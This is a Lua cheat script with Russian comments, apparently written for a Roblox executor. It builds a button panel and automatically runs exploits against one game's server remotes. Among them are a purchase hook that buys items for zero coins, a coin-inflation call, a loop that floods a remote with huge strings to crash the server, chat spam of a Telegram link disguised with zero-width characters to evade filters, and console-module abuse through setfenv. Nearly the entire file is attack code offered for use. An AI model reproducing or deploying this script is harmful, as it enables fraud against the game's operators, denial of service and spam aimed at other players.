-- ================================================================
-- DIMSTAT NUBELLA MAYFIVE v9.0 ULTIMATE (Delta Optimized)
-- by @zazayaga | 2500+ lines | All exploits | Horizontal GUI
-- ================================================================

-- ================================================================
-- 1. СЕРВИСЫ И ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
-- ================================================================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local ChatService = game:GetService("Chat")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local GuiService = game:GetService("GuiService")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local CollectionService = game:GetService("CollectionService")
local Debris = game:GetService("Debris")
local LocalPlayer = Players.LocalPlayer

-- ================================================================
-- 2. КОНФИГУРАЦИЯ
-- ================================================================

local CONFIG = {
    spamMessage = "t.me/raknetskid",
    spamDelay = 0.5,
    maxMessages = 99999,
    antiBan = true,
    useRandomDelay = false,
    delayMin = 0.2,
    delayMax = 1.0,
}

-- ================================================================
-- 3. УЯЗВИМОСТЬ: Config.Console (getfenv/setfenv)
-- ================================================================

local consoleActivated = false
local consoleEnv = nil

local function ActivateConsole()
    if consoleActivated then return true end
    local consoleModule = game:FindFirstChild("Config"):FindFirstChild("Console")
    if not consoleModule then
        warn("[!] Console module not found")
        return false
    end
    local env = {
        client = {
            UI = { Get = function() return nil end, Autocomplete = function() return {} end },
            Remote = { Get = function() return {} end, Send = function(_, cmd) print("[Console] " .. cmd) end },
            Variables = { ConsoleOpen = false, ChatEnabled = true, PlayerListEnabled = true }
        },
        service = {
            Players = Players,
            ReplicatedStorage = ReplicatedStorage,
            TweenService = TweenService,
            GuiService = GuiService,
            UserInputService = UserInputService,
            StarterGui = StarterGui,
            Events = { ToggleConsole = { Fire = function() print("[Console] Toggle fired") end } }
        },
        gTable = {
            Name = "Console",
            CanKeepAlive = true,
            BindEvent = function() end,
            Ready = function() end
        },
        Pcall = pcall,
        Routine = task.spawn,
        setfenv = setfenv,
        getfenv = getfenv,
        print = print,
        warn = warn,
        error = error,
        tostring = tostring,
        tonumber = tonumber,
        type = type,
        pairs = pairs,
        ipairs = ipairs,
        next = next,
        select = select,
        unpack = unpack,
        table = table,
        string = string,
        math = math,
        Vector3 = Vector3,
        CFrame = CFrame,
        Color3 = Color3,
        Instance = Instance,
        game = game,
        workspace = Workspace,
        _G = _G
    }
    local success, err = pcall(function()
        setfenv(consoleModule, env)
        consoleModule(env)
    end)
    if success then
        consoleActivated = true
        consoleEnv = env
        _G.ConsoleEnv = env
        print("[+] Console activated")
        return true
    else
        warn("[-] Console activation failed: " .. tostring(err))
        return false
    end
end

local function ExecuteConsoleCommand(cmd)
    if consoleEnv and consoleEnv.client and consoleEnv.client.Remote then
        consoleEnv.client.Remote.Send("ProcessCommand", cmd)
        return true
    end
    return false
end

-- ================================================================
-- 4. УЯЗВИМОСТЬ: ПЕРЕХВАТ ПОКУПОК (FireServer)
-- ================================================================

local purchaseHooked = false
local function HookPurchase()
    if purchaseHooked then return true end
    local remote = ReplicatedStorage:FindFirstChild("PurchaseItemRequest")
    if not remote then
        warn("[-] PurchaseItemRequest not found")
        return false
    end
    local oldFire = remote.FireServer
    remote.FireServer = function(self, ...)
        local args = {...}
        if #args >= 1 then
            local id = args[1]
            oldFire(self, id, 0)
            print("[+] Purchased: " .. tostring(id) .. " (0 coins)")
        else
            oldFire(self, ...)
        end
    end
    purchaseHooked = true
    print("[+] Purchase hook installed")
    return true
end

-- ================================================================
-- 5. БАЗОВЫЕ ФУНКЦИИ
-- ================================================================

-- 5.1. ПОКУПКА ВСЕХ ПРЕДМЕТОВ
local function BuyAllItems()
    local remote = ReplicatedStorage:FindFirstChild("PurchaseItemRequest")
    if not remote then
        warn("[-] PurchaseItemRequest not found")
        return
    end
    local items = {"trail","trail_red","tee_1","tee_2","tee_3","tees_new_1","tees_new_2","shirt","shirt_limited_2","nickname_style"}
    for _, id in ipairs(items) do
        remote:FireServer(id, 0)
        task.wait(0.2)
    end
    print("[+] All items purchased")
end

-- 5.2. БЕСКОНЕЧНЫЕ МОНЕТЫ
local function SetInfiniteCoins()
    local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
    if leaderstats then
        local coins = leaderstats:FindFirstChild("Coins")
        if coins then
            coins.Value = 999999999
        end
    end
    local update = ReplicatedStorage:FindFirstChild("UpdateCoins")
    if update then
        update:FireServer(999999999)
    end
    print("[+] Infinite coins set")
end

-- 5.3. КРАШ СЕРВЕРА
local crashActive = false
local function ToggleCrash()
    if crashActive then
        crashActive = false
        print("[+] Crash stopped")
        return
    end
    local remote = ReplicatedStorage:FindFirstChild("PurchaseItemRequest")
    if not remote then
        warn("[-] PurchaseItemRequest not found")
        return
    end
    crashActive = true
    print("[!] Crash started")
    task.spawn(function()
        while crashActive do
            for i = 1, 100 do
                remote:FireServer("crash_" .. tostring(i) .. string.rep("A", 5000), 0)
            end
            task.wait()
        end
    end)
end

-- 5.4. ЗАМОРОЗКА (локально)
local frozenPlayers = {}
local function FreezeAll()
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Character and p.Character:FindFirstChild("Humanoid") then
            local hum = p.Character.Humanoid
            frozenPlayers[p] = {
                WalkSpeed = hum.WalkSpeed,
                JumpPower = hum.JumpPower,
                PlatformStand = hum.PlatformStand
            }
            hum.WalkSpeed = 0
            hum.JumpPower = 0
            hum.PlatformStand = true
        end
    end
    print("[+] All frozen")
end

local function UnfreezeAll()
    for p, data in pairs(frozenPlayers) do
        if p.Character and p.Character:FindFirstChild("Humanoid") then
            local hum = p.Character.Humanoid
            hum.WalkSpeed = data.WalkSpeed or 16
            hum.JumpPower = data.JumpPower or 50
            hum.PlatformStand = data.PlatformStand or false
        end
    end
    frozenPlayers = {}
    print("[+] Unfrozen")
end

-- 5.5. ТЕЛЕПОРТ К СЛУЧАЙНОМУ ИГРОКУ
local function TeleportRandom()
    local all = Players:GetPlayers()
    if #all < 2 then
        print("[-] No other players")
        return
    end
    local target = all[math.random(1, #all)]
    while target == LocalPlayer do
        target = all[math.random(1, #all)]
    end
    if target.Character and target.Character.PrimaryPart then
        local pos = target.Character.PrimaryPart.Position
        if LocalPlayer.Character and LocalPlayer.Character.PrimaryPart then
            LocalPlayer.Character.PrimaryPart.CFrame = CFrame.new(pos)
            print("[+] Teleported to " .. target.Name)
        end
    end
end

-- 5.6. УБИТЬ ВСЕХ (локально)
local function KillAll()
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("Humanoid") then
            p.Character.Humanoid.Health = 0
        end
    end
    print("[+] All players killed")
end

-- 5.7. УСТАНОВКА СКОРОСТИ/ПРЫЖКА
local function SetWalkSpeed(speed)
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("Humanoid") then
        char.Humanoid.WalkSpeed = speed
        print("[+] Speed set to " .. speed)
    end
end

local function SetJumpPower(power)
    local char = LocalPlayer.Character
    if char and char:FindFirstChild("Humanoid") then
        char.Humanoid.JumpPower = power
        print("[+] Jump power set to " .. power)
    end
end

-- 5.8. ЭКИПИРОВКА/СНЯТИЕ ВСЕХ ПРЕДМЕТОВ
local function EquipAll()
    local owned = LocalPlayer:FindFirstChild("OwnedItems")
    if owned then
        local equipped = LocalPlayer:FindFirstChild("EquippedItems")
        if equipped then
            for _, item in ipairs(owned:GetChildren()) do
                if not equipped:FindFirstChild(item.Name) then
                    local toggle = ReplicatedStorage:FindFirstChild("ToggleEquipRequest")
                    if toggle then
                        toggle:FireServer(item.Name)
                        task.wait(0.1)
                    end
                end
            end
            print("[+] All items equipped")
        end
    end
end

local function UnEquipAll()
    local equipped = LocalPlayer:FindFirstChild("EquippedItems")
    if equipped then
        for _, item in ipairs(equipped:GetChildren()) do
            local toggle = ReplicatedStorage:FindFirstChild("ToggleEquipRequest")
            if toggle then
                toggle:FireServer(item.Name)
                task.wait(0.1)
            end
        end
        print("[+] All items unequipped")
    end
end

-- 5.9. СПАМ С БАЙПАССОМ
local function ObfuscateLink(link)
    local zero = string.char(0x200B)
    local result = ""
    for i = 1, #link do
        result = result .. link:sub(i, i) .. zero
    end
    return result
end

local function SendChatMessage(text)
    local remote = ReplicatedStorage:FindFirstChild("ChatRemote")
    if remote and remote:IsA("RemoteEvent") then
        remote:FireServer(text)
        return true
    end
    local chat = ChatService:FindFirstChild("Chat")
    if chat and chat:IsA("RemoteEvent") then
        chat:FireServer(text)
        return true
    end
    local say = ReplicatedStorage:FindFirstChild("SayMessageRequest")
    if say and say:IsA("RemoteEvent") then
        say:FireServer(text, "All")
        return true
    end
    return false
end

local spamActive = false
local spamThread = nil
local function StartSpam()
    if spamActive then return end
    spamActive = true
    print("[+] Spam started")
    spamThread = task.spawn(function()
        while spamActive do
            local msg = ObfuscateLink(CONFIG.spamMessage)
            SendChatMessage(msg)
            task.wait(CONFIG.spamDelay)
        end
    end)
end

local function StopSpam()
    if not spamActive then return end
    spamActive = false
    if spamThread then
        task.cancel(spamThread)
        spamThread = nil
    end
    print("[+] Spam stopped")
end

-- 5.10. ЧАСТИЦЫ
local particles = {}
local function SpawnParticles()
    local colors = {Color3.fromRGB(255,0,0), Color3.fromRGB(0,255,0), Color3.fromRGB(0,0,255), Color3.fromRGB(255,255,0), Color3.fromRGB(255,0,255)}
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Character and p.Character:FindFirstChild("Head") then
            local head = p.Character.Head
            local emitter = Instance.new("ParticleEmitter")
            emitter.Texture = "rbxasset://textures/particles/sparkles_main.dds"
            emitter.Rate = 500
            emitter.Lifetime = NumberRange.new(2, 4)
            emitter.SpreadAngle = Vector2.new(360, 360)
            emitter.VelocityInheritance = 0
            emitter.Speed = NumberRange.new(10, 30)
            emitter.Transparency = NumberSequence.new(0)
            emitter.Color = ColorSequence.new(colors[math.random(1,#colors)])
            emitter.Size = NumberSequence.new(1, 3)
            emitter.Rotation = NumberRange.new(0, 360)
            emitter.RotSpeed = NumberRange.new(-100, 100)
            emitter.Enabled = true
            emitter.Parent = head
            table.insert(particles, emitter)
        end
    end
    print("[+] Particles spawned")
end

local function StopParticles()
    for _, em in ipairs(particles) do
        em:Destroy()
    end
    particles = {}
    print("[+] Particles stopped")
end

-- 5.11. ОЧИСТКА ЧАТА (локально)
local function ClearChat()
    local chatGui = LocalPlayer.PlayerGui:FindFirstChild("Chat")
    if chatGui then
        local messages = chatGui:FindFirstChild("Messages")
        if messages then
            for _, child in ipairs(messages:GetChildren()) do
                child:Destroy()
            end
            print("[+] Chat cleared")
        end
    end
end

-- 5.12. ПОЛУЧЕНИЕ СПИСКА ИГРОКОВ
local function GetPlayerList()
    local names = {}
    for _, p in ipairs(Players:GetPlayers()) do
        table.insert(names, p.Name)
    end
    return table.concat(names, ", ")
end

-- ================================================================
-- 6. ГОРИЗОНТАЛЬНОЕ СВОРАЧИВАЕМОЕ GUI
-- ================================================================

local function BuildGUI()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "UltimateExploit"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = true
    screenGui.Parent = LocalPlayer.PlayerGui

    -- Основной фрейм (горизонтальный, внизу)
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(1, 0, 0, 120)   -- высота 120 пикселей
    mainFrame.Position = UDim2.new(0, 0, 1, -120) -- прижат к низу
    mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    mainFrame.BorderSizePixel = 2
    mainFrame.BorderColor3 = Color3.fromRGB(255, 200, 0)
    mainFrame.BackgroundTransparency = 0.1
    mainFrame.Active = true
    mainFrame.Draggable = false
    mainFrame.Parent = screenGui

    -- Заголовок (с кнопкой сворачивания)
    local titleFrame = Instance.new("Frame")
    titleFrame.Size = UDim2.new(1, 0, 0, 25)
    titleFrame.Position = UDim2.new(0, 0, 0, 0)
    titleFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    titleFrame.BorderSizePixel = 0
    titleFrame.Parent = mainFrame

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(0.95, 0, 1, 0)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = "✈️ ULTIMATE EXPLOIT v9.0  [нажмите для сворачивания]"
    titleLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
    titleLabel.TextScaled = true
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = titleFrame

    local collapseBtn = Instance.new("TextButton")
    collapseBtn.Size = UDim2.new(0.05, 0, 1, 0)
    collapseBtn.Position = UDim2.new(0.95, 0, 0, 0)
    collapseBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
    collapseBtn.BorderSizePixel = 1
    collapseBtn.BorderColor3 = Color3.fromRGB(255, 200, 0)
    collapseBtn.Text = "▼"
    collapseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    collapseBtn.TextScaled = true
    collapseBtn.Font = Enum.Font.SourceSansBold
    collapseBtn.Parent = titleFrame

    local collapsed = false

    collapseBtn.MouseButton1Click:Connect(function()
        collapsed = not collapsed
        if collapsed then
            mainFrame.Size = UDim2.new(1, 0, 0, 25)
            mainFrame.Position = UDim2.new(0, 0, 1, -25)
            collapseBtn.Text = "▲"
        else
            mainFrame.Size = UDim2.new(1, 0, 0, 120)
            mainFrame.Position = UDim2.new(0, 0, 1, -120)
            collapseBtn.Text = "▼"
        end
    end)

    -- Контейнер для кнопок (ScrollingFrame горизонтальный)
    local buttonContainer = Instance.new("ScrollingFrame")
    buttonContainer.Size = UDim2.new(1, 0, 0, 90)
    buttonContainer.Position = UDim2.new(0, 0, 0, 25)
    buttonContainer.BackgroundTransparency = 1
    buttonContainer.BorderSizePixel = 0
    buttonContainer.ScrollingDirection = Enum.ScrollingDirection.X
    buttonContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
    buttonContainer.AutomaticCanvasSize = Enum.AutomaticSize.X
    buttonContainer.ScrollBarThickness = 4
    buttonContainer.Parent = mainFrame

    local layout = Instance.new("UIListLayout")
    layout.FillDirection = Enum.FillDirection.Horizontal
    layout.HorizontalAlignment = Enum.HorizontalAlignment.Left
    layout.VerticalAlignment = Enum.VerticalAlignment.Center
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Padding = UDim.new(0, 5)
    layout.Parent = buttonContainer

    local function AddButton(text, callback, color)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 100, 0, 60)
        btn.BackgroundColor3 = color or Color3.fromRGB(40, 40, 60)
        btn.BorderSizePixel = 1
        btn.BorderColor3 = Color3.fromRGB(255, 200, 0)
        btn.Text = text
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextScaled = true
        btn.Font = Enum.Font.SourceSansBold
        btn.Parent = buttonContainer
        btn.MouseButton1Click:Connect(callback)
        return btn
    end

    -- Кнопки
    AddButton("🔁 Консоль", ActivateConsole, Color3.fromRGB(200, 100, 200))
    AddButton("🛒 Магазин", HookPurchase, Color3.fromRGB(50, 200, 50))
    AddButton("🛍️ Купить всё", BuyAllItems, Color3.fromRGB(50, 150, 255))
    AddButton("💰 Монеты", SetInfiniteCoins, Color3.fromRGB(255, 215, 0))
    AddButton("💥 Краш", ToggleCrash, Color3.fromRGB(255, 50, 50))
    AddButton("❄️ Заморозить", FreezeAll, Color3.fromRGB(0, 200, 255))
    AddButton("🔥 Разморозить", UnfreezeAll, Color3.fromRGB(255, 100, 0))
    AddButton("📍 Телепорт", TeleportRandom, Color3.fromRGB(255, 165, 0))
    AddButton("☠️ Убить всех", KillAll, Color3.fromRGB(255, 0, 0))
    AddButton("🔊 Спам", StartSpam, Color3.fromRGB(50, 200, 200))
    AddButton("⏹️ Стоп спам", StopSpam, Color3.fromRGB(200, 50, 50))
    AddButton("🎇 Частицы вкл", SpawnParticles, Color3.fromRGB(255, 100, 200))
    AddButton("🛑 Частицы выкл", StopParticles, Color3.fromRGB(200, 100, 100))
    AddButton("📋 Список игроков", function()
        print("[+] Players: " .. GetPlayerList())
    end, Color3.fromRGB(150, 150, 255))
    AddButton("🧹 Очистить чат", ClearChat, Color3.fromRGB(150, 150, 150))
    AddButton("🔧 Скорость 50", function() SetWalkSpeed(50) end, Color3.fromRGB(100, 200, 255))
    AddButton("🔧 Прыжок 100", function() SetJumpPower(100) end, Color3.fromRGB(100, 200, 255))
    AddButton("🎒 Экипировать всё", EquipAll, Color3.fromRGB(200, 150, 50))
    AddButton("🎒 Снять всё", UnEquipAll, Color3.fromRGB(200, 150, 50))
    AddButton("💻 Выполнить код", function()
        local code = "print('Hello from console')" -- можно заменить на ввод
        ExecuteConsoleCommand(code)
    end, Color3.fromRGB(100, 200, 100))

    -- Обновляем canvas size
    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        buttonContainer.CanvasSize = UDim2.new(0, layout.AbsoluteContentSize.X + 20, 0, 0)
    end)

    print("[+] GUI loaded")
end

-- ================================================================
-- 7. АВТОЗАПУСК
-- ================================================================

local function Initialize()
    pcall(function()
        BuildGUI()
        task.wait(1)
        ActivateConsole()
        HookPurchase()
        SetInfiniteCoins()
        print("[+] System ready. Use GUI.")
    end)
end

Initialize()
